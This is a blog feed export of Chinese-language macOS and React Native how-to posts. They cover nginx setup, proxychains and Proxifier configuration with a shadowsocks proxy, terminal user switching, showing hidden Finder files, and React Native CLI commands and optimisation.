<p>　　<img src="https://upload-images.jianshu.io/upload_images/10024246-4a716a1bef024b54.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>　　会看到一个以当前安装的nginx的版本号为名称的文件夹，这个就是我们安装的nginx根目录啦。进入1.12.2_1/bin 目录，会看到nginx的可执行启动文件。</p>
<p>　　同样的，我们在1.12.2_1/目录下还可以看到一个名字为html的快捷方式文件夹（暂且就这么叫吧），进入该目录我们会发现其实它指向的就是/usr/local/var/www目录，这个在上面我们查看的info信息中有提到（Dcroot）</p>
<p> 　　6、启动nginx，终端输入如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nginx</span><br></pre></td></tr></table></figure>

<p>　　没有报错即为启动成功。<br>　　7、访问验证：</p>
<p>　　　　打开浏览器访问localhost:8080,这里跟网上的一些教程会有些不一样，正常情况下到这一步就会能看到nginx的欢迎界面啦，然而博主却遇到了坑爹的情况（如果你能正常看到nginx欢迎界面，可以直接跳过这一步了）</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-c85425af5395d326.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p> 　　想必这个错误大家都很熟悉了，我就不再多做解释，接下来直接说原因（该原因仅为猜测，因为无从验证）：安装的nginx会默认在html（也就是/usr/local/var/www）目录下生成一个欢迎页面文件，而出现上面这种情况就是欢迎页面文件没有生成（至于为什么没有生成就不得而知了，一切都是猜测）。</p>
<p>　　那在解决这个问题之前，我们先来了解一下nginx的配置文件吧（nginx.conf）:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;local&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>

<p>　　显示配置文件的代码为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#user  nobody;</span><br><span class="line">worker_processes 1;</span><br><span class="line"></span><br><span class="line">#error_log  logs&#x2F;error.log;</span><br><span class="line">#error_log  logs&#x2F;error.log  notice;</span><br><span class="line">#error_log  logs&#x2F;error.log  info;</span><br><span class="line"></span><br><span class="line">#pid        logs&#x2F;nginx.pid;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections 1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application&#x2F;octet-stream;</span><br><span class="line"></span><br><span class="line">    #log_format  main &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39; # &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39; # &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;;</span><br><span class="line"></span><br><span class="line">    #access_log  logs&#x2F;access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout 0;</span><br><span class="line">    keepalive_timeout 65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">　　　　 #侦听8080端口</span><br><span class="line">        listen 8080;</span><br><span class="line">　　　　 #定义使用 localhost访问</span><br><span class="line">        server_name  localhost;</span><br><span class="line"></span><br><span class="line">        #charset koi8-r;</span><br><span class="line"></span><br><span class="line">        #access_log  logs&#x2F;host.access.log  main;</span><br><span class="line"></span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">　　　　　　　#定义服务器的默认网站根目录位置</span><br><span class="line">            root   html;</span><br><span class="line">　　　　　　  #定义首页索引文件的名称</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">　　　　　...</span><br><span class="line">　　　　　...</span><br><span class="line">　　　　　... (注释代码太多，就不全部贴出来了)  include servers&#x2F;*;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>　　通过配置文件我们可以看到其默认的网站根目录为html（即/usr/local/var/www），而默认的索引文件为index.html 和 index.htm，这下就找到原因了，原来我们的根目录少了首页索引文件，那就来手动创建一个吧：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;var&#x2F;www&#x2F;                      &#x2F;&#x2F;进入到www目录下</span><br><span class="line">touch index.html                            &#x2F;&#x2F;创建一个新的index.html文件</span><br><span class="line">vim index.html                              &#x2F;&#x2F;编辑该文件 &lt;&#x2F;pre&gt;</span><br><span class="line">&#96;&#96;&#96;&#96;</span><br><span class="line">　　将如下代码写入index.html文件中：</span><br></pre></td></tr></table></figure>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>title</title>
</head>
<body>
    <div>
        <h1>我的nginx欢迎页面</h1>
    </div>
</body>
</html>
```


<p>　　回到浏览器（localhost:8080）刷新：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-669dfb5bb1851e49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>　　OK，大功告成啦！</p>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
  </entry>
  <entry>
    <title>利用proxychains在终端使用socks5代理</title>
    <url>/nirvana/mac/mac/%E5%88%A9%E7%94%A8proxychains%E5%9C%A8%E7%BB%88%E7%AB%AF%E4%BD%BF%E7%94%A8socks5%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h3 id="1-proxychains安装"><a href="#1-proxychains安装" class="headerlink" title="1.proxychains安装"></a>1.proxychains安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;rofl0r&#x2F;proxychains-ng.git</span><br><span class="line">cd proxychains-ng</span><br><span class="line">.&#x2F;configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">cp .&#x2F;src&#x2F;proxychains.conf &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line">cd .. &amp;&amp; rm -rf proxychains-ng (先修改再cp)</span><br></pre></td></tr></table></figure>
<p>也可以用<code>brew install proxychains-ng</code>安装。<br>2.编辑proxychains配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br></pre></td></tr></table></figure>
<p>3.将socks4 127.0.0.1 9095改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure>
<p><em><strong>ps: 默认的socks4 127.0.0.1 9095是tor代理，而socks5 127.0.0.1 1080是shadowsocks的代理。</strong></em></p>
<p>proxychains.conf文件说明了代理配置格式,如下,这里根据自己使用的代理来配置就行了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ProxyList format</span><br><span class="line"> 94 #       type  ip  port  [user pass]</span><br><span class="line"> 95 #       (values separated by &#39;tab&#39; or &#39;blank&#39;)</span><br><span class="line"> 96 #</span><br><span class="line"> 97 #       only numeric ipv4 addresses are valid</span><br><span class="line"> 98 #</span><br><span class="line"> 99 #</span><br><span class="line">100 #        Examples:</span><br><span class="line">101 #</span><br><span class="line">102 #       socks5  192.168.67.78   1080    lamer   secret</span><br><span class="line">103 #       http    192.168.89.3    8080    justu   hidden</span><br><span class="line">104 #       socks4  192.168.1.49    1080</span><br><span class="line">105 #       http    192.168.39.93   8080</span><br></pre></td></tr></table></figure>
<p>4.使用方法<br>在需要代理的命令前加上 proxychains4 ，如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains4 wget http:&#x2F;&#x2F;xxx.com&#x2F;xxx.zip</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
  </entry>
  <entry>
    <title>mac终端切换用户</title>
    <url>/nirvana/mac/mac/mac%E7%BB%88%E7%AB%AF%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7/</url>
    <content><![CDATA[<p>1、mac终端切换用户到root<br>sudo -i即可</p>
<p>2、mac终端切换成普通用户<br>su - test（test为用户名）即可</p>
<p>3、mac可以设置命令别名<br>如ll，正常情况下，mac终端不识别ll命令，但是alias 命令设置别名后，终端即可以设别ll命令：alias ll=’ls -la’；但是没有修改系统文件，则该命令只能临时生效，下次再打开终端，还是不能识别ll命令，永久生效办法，请修改系统文件，方法有多种，请自行百度（如果不是ll命令，其他命令同理）<br>————————————————<br>版权声明：本文为CSDN博主「CoberOJ_」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/huodoubi/article/details/69948483">https://blog.csdn.net/huodoubi/article/details/69948483</a></p>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
  </entry>
  <entry>
    <title></title>
    <url>/nirvana/uncategorized/mac/%E5%9C%A8-Mac-%E4%B8%8A%E5%AE%89%E8%A3%9D-Windows%E8%BD%AF%E4%BB%B6/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>苹果Mac操作系统下怎么显示隐藏文件</title>
    <url>/nirvana/mac/mac/%E8%8B%B9%E6%9E%9CMac%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%80%8E%E4%B9%88%E6%98%BE%E7%A4%BA%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p>方法一：<br>第一步：打开「终端」应用程序。<br>第二步：输入如下命令：<br><code>defaults write com.apple.finder AppleShowAllFiles -boolean true ; killall Finder</code><br>第三步：按下「Return」键确认。<br>现在你将会在 Finder 窗口中看到那些隐藏的文件和文件夹了。<br>如果你想再次隐藏原本的隐藏文件和文件夹的话，将上述命令替换成<br><code>defaults write com.apple.finder AppleShowAllFiles -boolean false ; killall Finder</code><br>即可。<br>方法二：<br>Finder界面是，最上方，通过“前往”进入“电脑”或文件夹，先进入到需要显示隐藏文件的文件夹下<br>接着按<code>Command+F</code>,在窗格上会显示搜索栏<br>然后将第一个下列选择项“种类kind”选择为“其它Other”，当选择“其它”时，弹出新的搜索窗口，找到下面的“文件不可见File invisible”项，勾上后面的对勾，再单击“好OK”即可，返回文件夹，就可以看到，隐藏的文件已经显示出来了</p>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
  </entry>
  <entry>
    <title>解决-mac-（windows）终端上代理的难题</title>
    <url>/nirvana/mac/mac/%E8%A7%A3%E5%86%B3-mac-%EF%BC%88windows%EF%BC%89%E7%BB%88%E7%AB%AF%E4%B8%8A%E4%BB%A3%E7%90%86%E7%9A%84%E9%9A%BE%E9%A2%98/</url>
    <content><![CDATA[<p>买了 ss （shadowsocks）帐号，装了 ss 代理的软件，浏览器上也装了代理的插件，一直用的都挺好的，但是最近遇到了一些情况</p>
<p>情况1：最近网络抽风，网页上访问 github 还好，但是在终端里，git clone 一个 repository，或者在 webstorm 中检出一个 github 上的repository，那是相当的痛苦</p>
<p>情况2：同事在安装 brew 的过程中，需要下载 github 上的repository，于是遭受了和上面一样的痛苦</p>
<p>不仅仅如此，为了解决类似的麻烦，很多人使用了 cnpm（淘宝出的代替 npm 的工具），或者更换各种包仓库的地址为国内镜像的地址，归根到底为一个原因，终端里的命令：诸如 wget，curl，git ，npm 等等，不好设置代理翻墙。</p>
<p>经过本人的探索，找出了一条解决之道，先不说麻不麻烦，总归是解决了长久以来困扰自己的问题</p>
<p>你所需要的，要有一个 ss 帐号，mac 上安装 shadowsocksX，已设置本地代理：socks5：127.0.0.1：1080</p>
<p>还需要另外一个神器：proxifier</p>
<p>举个例子，在终端里 git clone 一个repository，究竟是什么程序发起了网络请求，我现在可以直接告诉你答案，是 git-remote-https，请求 github.com:443，使用proxifier，就可以做到这一点，定位到是什么程序，请求的 host 以及 port，并且给它设置代理</p>
<p>下面这张图就是proxifier的庐山真面目了<br><img src="http://upload-images.jianshu.io/upload_images/10024246-fd097bed09c20d84.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1515804585324.jpg"><br>上面的日志给出了详细的解释<br>当我在终端里敲下 npm install xxx，对应的就是 node 请求 registry.npmjs.org:443<br>当我在webstorm中设置 github 帐户的时候，对应的是 webstorm，请求 api.github.com:443<br>当我在 git clone repository的时候，对应的是git-remote-https 请求 github.com:443</p>
<p>第一步：你得在shadowsocksX中开启 socks5 的本地代理，这是最重要的前提<br>第二步：在proxifier使用第一步设置的代理，如下图所示<br><img src="http://upload-images.jianshu.io/upload_images/10024246-92b4c7cb079bde84.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1515804585324.jpg"><br>第三步：设置代理规则<br>image_1b4og01u91alg1ggk1mh51omdurr1g.png-479.7kB</p>
<p>解释一下我所设置的规则：<br>image_1b4og4c2k2i6j8b1jdjd03has1t.png-185.6kB<br>规则匹配的顺序是从上往下的 </p>
<ol>
<li>生效的第一条规则是shadowsocksX，因为我们的代理就是靠这个程序的，所以不能让它自己代理自己，否则proxifier 会报无限循环，动作选 direct </li>
<li>规则 github，这里也并没有指定程序git-remote-https，因为 像 webstorm等 GUI 之流，也会访问 github：443的请求，所以不指定程序，只限制 主机和端口，应用范围就不限于终端了 </li>
<li>规则 node，解决 npm install 的代理，可以不用 cnpm 了 </li>
<li>规则 brew，解决终端下使用 brew 安装 package 的代理 </li>
<li>规则 google-analytics，，解决终端下使用 brew 安装 package 的代理 </li>
<li>规则 default，不能删除，当匹配不到任何规则的时候，使用该规则</li>
</ol>
<p>任何一个连接请求，从上往下匹配，匹配到了，就会停止<br>以上就是我摸索出来的方法，如果 ss 速度快的话，相信我，你会开心死的</p>
<p>一言以蔽之，如果你在终端中发起了网络请求速度很慢的话，可以先把 default 规则，设置为socks5代理（只有设置为代理，日志才会记录），然后分析一下请求的 host：port，然后就可以添加规则了，这样的话，就做到只给部分请求走代理，如果你觉得这样很麻烦，<br>也可以简单粗暴的，将 default 规则设置为 socks5代理，其余的规则全部禁用，那就是全部的请求走代理</p>
<p><a href="https://pan.baidu.com/s/1qYdGRBA">Mac 版 shadowsocksX 和 proxifier 下载</a></p>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
  </entry>
  <entry>
    <title>React-Native-1px处理</title>
    <url>/nirvana/reactnative/react-native/React-Native-1px%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<p>当UI设计图上标注某间距为1px时，只需在间距设置的地方填如下值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123;</span><br><span class="line">  View,</span><br><span class="line">  StyleSheet,</span><br><span class="line">  PixelRatio, </span><br><span class="line">&#125; from &#39;react-native&#39;</span><br><span class="line">&#x2F;&#x2F;要用到 PixelRatio.get() 则需从react-native组件中引用 PixelRatio</span><br><span class="line">1px:&#123;</span><br><span class="line">        height:1 &#x2F; PixelRatio.get()</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>reactnative</category>
      </categories>
  </entry>
  <entry>
    <title>React-Native-基本命令汇总</title>
    <url>/nirvana/reactnative/react-native/React-Native-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<p>最近进行React Native的一些优化工作，发现React Native提供了很多简单方便的配置，但是自己一直没有使用过，而且React Native提供了非常好的help功能，会列出对应的说明和example，这边简单整理下一些常用的命令。</p>
<h2 id="1-查看所有命令-react-native-–help"><a href="#1-查看所有命令-react-native-–help" class="headerlink" title="1. 查看所有命令 react-native –help"></a>1. 查看所有命令 <em><strong>react-native –help</strong></em></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mac:react-native --help</span><br><span class="line"></span><br><span class="line">  Usage: react-native [options] [command]</span><br><span class="line"></span><br><span class="line">  Options:</span><br><span class="line"></span><br><span class="line">    -V, --version                      output the version number</span><br><span class="line">    -h, --help                         output usage information</span><br><span class="line"></span><br><span class="line">  Commands:</span><br><span class="line"></span><br><span class="line">    start [options]                    starts the webserver</span><br><span class="line">    run-ios [options]                  builds your app and starts it on iOS simulator</span><br><span class="line">    run-android [options]              builds your app and starts it on a connected Android emulator or device</span><br><span class="line">    new-library [options]              generates a native library bridge</span><br><span class="line">    bundle [options]                   builds the javascript bundle for offline use</span><br><span class="line">    unbundle [options]                 builds javascript as &quot;unbundle&quot; for offline use</span><br><span class="line">    eject [options]                    Re-create the iOS and Android folders and native code</span><br><span class="line">    link [options] [packageName]       links all native dependencies (updates native build files)</span><br><span class="line">    unlink [options] &lt;packageName&gt;     unlink native dependency</span><br><span class="line">    install [options] &lt;packageName&gt;    install and link native dependencies</span><br><span class="line">    uninstall [options] &lt;packageName&gt;  uninstall and unlink native dependencies</span><br><span class="line">    upgrade [options]                  upgrade your app&#39;s template files to the latest version; run this after updating the react-native version in your package.json and running npm install</span><br><span class="line">    log-android [options]              starts adb logcat</span><br><span class="line">    log-ios [options]                  starts iOS device syslog tail</span><br><span class="line">    info [options]                     Get relevant version info about OS, toolchain and libraries</span><br></pre></td></tr></table></figure>

<h2 id="2-最常用的启动命令react-native-start"><a href="#2-最常用的启动命令react-native-start" class="headerlink" title="2. 最常用的启动命令react-native start"></a>2. 最常用的启动命令<em><strong>react-native start</strong></em></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mac:react-native start --help</span><br><span class="line">react-native start [options]</span><br><span class="line">  starts the webserver</span><br><span class="line"></span><br><span class="line">  Options:</span><br><span class="line"></span><br><span class="line">    --port [number]                                                (default: 8081)</span><br><span class="line">    --host [string]                                                (default: )</span><br><span class="line">    --root [list]                                                 add another root(s) to be used by the packager in this project (default: )</span><br><span class="line">    --projectRoots [list]                                         override the root(s) to be used by the packager (default: &#x2F;Users&#x2F;mac&#x2F;mallCategory)</span><br><span class="line">    --assetExts [list]                                            Specify any additional asset extensions to be used by the packager (default: )</span><br><span class="line">    --sourceExts [list]                                           Specify any additional source extensions to be used by the packager (default: )</span><br><span class="line">    --platforms [list]                                            Specify any additional platforms to be used by the packager (default: )</span><br><span class="line">    --providesModuleNodeModules [list]                            Specify any npm packages that import dependencies with providesModule (default: react-native,react-native-windows)</span><br><span class="line">    --max-workers [number]                                        Specifies the maximum number of workers the worker-pool will spawn for transforming files. This defaults to the number of the cores available on your machine.</span><br><span class="line">    --skipflow                                                    Disable flow checks</span><br><span class="line">    --nonPersistent                                               Disable file watcher</span><br><span class="line">    --transformer [string]                                        Specify a custom transformer to be used</span><br><span class="line">    --reset-cache, --resetCache                                   Removes cached files</span><br><span class="line">    --custom-log-reporter-path, --customLogReporterPath [string]  Path to a JavaScript file that exports a log reporter as a replacement for TerminalReporter</span><br><span class="line">    --verbose                                                     Enables logging</span><br><span class="line">    --https                                                       Enables https connections to the server</span><br><span class="line">    --key [path]                                                  Path to custom SSL key</span><br><span class="line">    --cert [path]                                                 Path to custom SSL cert</span><br><span class="line">    --config [string]                                             Path to the CLI configuration file</span><br><span class="line">    -h, --help                                                    output usage information</span><br></pre></td></tr></table></figure>

<h2 id="3-iOS启动命令-react-native-–run-ios"><a href="#3-iOS启动命令-react-native-–run-ios" class="headerlink" title="3. iOS启动命令 react-native –run-ios"></a>3. iOS启动命令 <em><strong>react-native –run-ios</strong></em></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mac: react-native run-ios --help</span><br><span class="line"></span><br><span class="line">  react-native run-ios [options]</span><br><span class="line">  builds your app and starts it on iOS simulator</span><br><span class="line"></span><br><span class="line">  Options:</span><br><span class="line"></span><br><span class="line">    --simulator [string]      Explicitly set simulator to use (default: iPhone 6)</span><br><span class="line">    --configuration [string]  Explicitly set the scheme configuration to use</span><br><span class="line">    --scheme [string]         Explicitly set Xcode scheme to use</span><br><span class="line">    --project-path [string]   Path relative to project root where the Xcode project (.xcodeproj) lives. The default is &#39;ios&#39;. (default: ios)</span><br><span class="line">    --device [string]         Explicitly set device to use by name.  The value is not required if you have a single device connected.</span><br><span class="line">    --udid [string]           Explicitly set device to use by udid</span><br><span class="line">    --no-packager             Do not launch packager while building</span><br><span class="line">    --verbose                 Do not use xcpretty even if installed</span><br><span class="line">    --config [string]         Path to the CLI configuration file</span><br><span class="line">    -h, --help                output usage information</span><br><span class="line"></span><br><span class="line">  Example usage:</span><br><span class="line"></span><br><span class="line">    Run on a different simulator, e.g. iPhone 5:</span><br><span class="line">    react-native run-ios --simulator &quot;iPhone 5&quot;</span><br><span class="line"></span><br><span class="line">    Pass a non-standard location of iOS directory:</span><br><span class="line">    react-native run-ios --project-path &quot;.&#x2F;app&#x2F;ios&quot;</span><br><span class="line"></span><br><span class="line">    Run on a connected device, e.g. Max&#39;s iPhone:</span><br><span class="line">    react-native run-ios --device &quot;Max&#39;s iPhone&quot;</span><br></pre></td></tr></table></figure>
<h2 id="4-Android-启动命令-react-native-run-android"><a href="#4-Android-启动命令-react-native-run-android" class="headerlink" title="4. Android 启动命令 react-native run-android"></a>4. Android 启动命令 <em><strong>react-native run-android</strong></em></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mac: react-native run-android --help</span><br><span class="line"></span><br><span class="line">  react-native run-android [options]</span><br><span class="line">  builds your app and starts it on a connected Android emulator or device</span><br><span class="line"></span><br><span class="line">  Options:</span><br><span class="line"></span><br><span class="line">    --install-debug</span><br><span class="line">    --root [string]           Override the root directory for the android build (which contains the android directory) (default: )</span><br><span class="line">    --flavor [string]         --flavor has been deprecated. Use --variant instead</span><br><span class="line">    --variant [string]</span><br><span class="line">    --appFolder [string]      Specify a different application folder name for the android source. (default: app)</span><br><span class="line">    --appId [string]          Specify an applicationId to launch after build. (default: )</span><br><span class="line">    --appIdSuffix [string]    Specify an applicationIdSuffix to launch after build. (default: )</span><br><span class="line">    --main-activity [string]  Name of the activity to start (default: MainActivity)</span><br><span class="line">    --deviceId [string]       builds your app and starts it on a specific device&#x2F;simulator with the given device id (listed by running &quot;adb devices&quot; on the command line).</span><br><span class="line">    --no-packager             Do not launch packager while building</span><br><span class="line">    --port [number]            (default: 8081)</span><br><span class="line">    --config [string]         Path to the CLI configuration file</span><br><span class="line">    -h, --help                output usage information</span><br></pre></td></tr></table></figure>

<h2 id="5-生成bundle文件-react-native-bundle"><a href="#5-生成bundle文件-react-native-bundle" class="headerlink" title="5. 生成bundle文件 react-native bundle"></a>5. 生成bundle文件 <em><strong>react-native bundle</strong></em></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mac: react-native bundle --help</span><br><span class="line"></span><br><span class="line">  react-native bundle [options]</span><br><span class="line">  builds the javascript bundle for offline use</span><br><span class="line"></span><br><span class="line">  Options:</span><br><span class="line"></span><br><span class="line">    --entry-file &lt;path&gt;                Path to the root JS file, either absolute or relative to JS root</span><br><span class="line">    --platform [string]                Either &quot;ios&quot; or &quot;android&quot; (default: ios)</span><br><span class="line">    --transformer [string]             Specify a custom transformer to be used</span><br><span class="line">    --dev [boolean]                    If false, warnings are disabled and the bundle is minified (default: true)</span><br><span class="line">    --bundle-output &lt;string&gt;           File name where to store the resulting bundle, ex. &#x2F;tmp&#x2F;groups.bundle</span><br><span class="line">    --bundle-encoding [string]         Encoding the bundle should be written in (https:&#x2F;&#x2F;nodejs.org&#x2F;api&#x2F;buffer.html#buffer_buffer). (default: utf8)</span><br><span class="line">    --max-workers [number]             Specifies the maximum number of workers the worker-pool will spawn for transforming files.This defaults to the number of the cores available on your machine.</span><br><span class="line">    --sourcemap-output [string]        File name where to store the sourcemap file for resulting bundle, ex. &#x2F;tmp&#x2F;groups.map</span><br><span class="line">    --sourcemap-sources-root [string]  Path to make sourcemap&#39;s sources entries relative to, ex. &#x2F;root&#x2F;dir</span><br><span class="line">    --sourcemap-use-absolute-path      Report SourceMapURL using its full path</span><br><span class="line">    --assets-dest [string]             Directory name where to store assets referenced in the bundle</span><br><span class="line">    --verbose                          Enables logging</span><br><span class="line">    --reset-cache                      Removes cached files</span><br><span class="line">    --read-global-cache                Try to fetch transformed JS code from the global cache, if configured.</span><br><span class="line">    --config [string]                  Path to the CLI configuration file</span><br><span class="line">    -h, --help                         output usage information</span><br></pre></td></tr></table></figure>
<h2 id="5-生成unbundle文件-react-native-unbundle"><a href="#5-生成unbundle文件-react-native-unbundle" class="headerlink" title="5. 生成unbundle文件 react-native unbundle"></a>5. 生成unbundle文件 <em><strong>react-native unbundle</strong></em></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mac: react-native unbundle --help</span><br><span class="line"></span><br><span class="line">  react-native unbundle [options]</span><br><span class="line">  builds javascript as &quot;unbundle&quot; for offline use</span><br><span class="line"></span><br><span class="line">  Options:</span><br><span class="line"></span><br><span class="line">    --entry-file &lt;path&gt;                Path to the root JS file, either absolute or relative to JS root</span><br><span class="line">    --platform [string]                Either &quot;ios&quot; or &quot;android&quot; (default: ios)</span><br><span class="line">    --transformer [string]             Specify a custom transformer to be used</span><br><span class="line">    --dev [boolean]                    If false, warnings are disabled and the bundle is minified (default: true)</span><br><span class="line">    --bundle-output &lt;string&gt;           File name where to store the resulting bundle, ex. &#x2F;tmp&#x2F;groups.bundle</span><br><span class="line">    --bundle-encoding [string]         Encoding the bundle should be written in (https:&#x2F;&#x2F;nodejs.org&#x2F;api&#x2F;buffer.html#buffer_buffer). (default: utf8)</span><br><span class="line">    --max-workers [number]             Specifies the maximum number of workers the worker-pool will spawn for transforming files.This defaults to the number of the cores available on your machine.</span><br><span class="line">    --sourcemap-output [string]        File name where to store the sourcemap file for resulting bundle, ex. &#x2F;tmp&#x2F;groups.map</span><br><span class="line">    --sourcemap-sources-root [string]  Path to make sourcemap&#39;s sources entries relative to, ex. &#x2F;root&#x2F;dir</span><br><span class="line">    --sourcemap-use-absolute-path      Report SourceMapURL using its full path</span><br><span class="line">    --assets-dest [string]             Directory name where to store assets referenced in the bundle</span><br><span class="line">    --verbose                          Enables logging</span><br><span class="line">    --reset-cache                      Removes cached files</span><br><span class="line">    --read-global-cache                Try to fetch transformed JS code from the global cache, if configured.</span><br><span class="line">    --indexed-unbundle                 Force indexed unbundle file format, even when building for android</span><br><span class="line">    --config [string]                  Path to the CLI configuration file</span><br><span class="line">    -h, --help                         output usage information</span><br></pre></td></tr></table></figure>

<h2 id="6-查看React-Native相关的信息-react-native-info"><a href="#6-查看React-Native相关的信息-react-native-info" class="headerlink" title="6. 查看React Native相关的信息 react-native info"></a>6. 查看React Native相关的信息 <em><strong>react-native info</strong></em></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mac: react-native info</span><br><span class="line"></span><br><span class="line">Environment:</span><br><span class="line">  OS: macOS High Sierra 10.13.6</span><br><span class="line">  Node: 10.0.0</span><br><span class="line">  Yarn: 1.9.4</span><br><span class="line">  npm: 5.6.0</span><br><span class="line">  Watchman: 4.7.0</span><br><span class="line">  Xcode: Xcode 10.1 Build version 10B61</span><br><span class="line">  Android Studio: 1.4 AI-141.2343393</span><br><span class="line"></span><br><span class="line">Packages: (wanted &#x3D;&gt; installed)</span><br><span class="line">  react: 16.2.0</span><br><span class="line">  react-native: 0.52.0</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>reactnative</category>
      </categories>
  </entry>
  <entry>
    <title>React-native-技术在壹钱包中的实践及优化</title>
    <url>/nirvana/reactnative/react-native/React-native-%E6%8A%80%E6%9C%AF%E5%9C%A8%E5%A3%B9%E9%92%B1%E5%8C%85%E4%B8%AD%E7%9A%84%E5%AE%9E%E8%B7%B5%E5%8F%8A%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<p><img src="https://upload-images.jianshu.io/upload_images/10024246-5cee99438e7340ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-cb00304de33dc6a7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-0be45ffec5a24d23.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-438492d08e3f2b1b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>REACT-NATIVE作为前端框架，到现在大概有三年的时间。我这边先分享一下为什么使用REACT-NATIVE。</p>
<p>首先REACT-NATIVE的开发效率，使用javaScript开发原生应用，提出Learn Once, Write Anywhere<br>的开发思想。兼容前端的最大优势灵活发布，可以支持线上业务功快速迭代和随时更新发布。又保证了用户体验，整体体验接近原生，远优于Hybrld和Web APP。同时整个框架保持很高的社区热度，自身框架不断的升级优化，有丰富的第三方组件。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-9e2b86157dc6a78a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>我们一开始接触RN是2015年，当时RN刚刚发布，在2015年12月基于0.17版本开发了同时兼容iOS和Android的Demo，整体体验还可以；同时我们一直在关注RN的发展，在2016年9月使用RN0.38版本开发收银台业务，12月份正式上线运行，同时实现了包括bundle拆分，热更新的技术。整体运行了3个月的事件，产品和运营对该技术的体验比较满意和认可，就在公司推进该框架的接入；2017年3月，商城业务接入，5月正式支撑公司大型活动，技术上实现了RN单实例，单文件diff；在2017年我们整个商城业务的主流程全部接入了RN，2018年又接入了理财商城业务。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-9beeb7a89b7a3c43.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>壹钱包的应用场景，我们有搜索分类，还有详情、会场、收银台、理财，后面就是我们正在做的5.20的活动，页面活动有很多的，商城里面很多应用，当时统计了一下，一个商品会场里面图片大概600多张，如果是RN原生的技术不优化的话，是无法支持这么大的应用场景，对于REACT-NATIVE我们做了性能优化。</p>
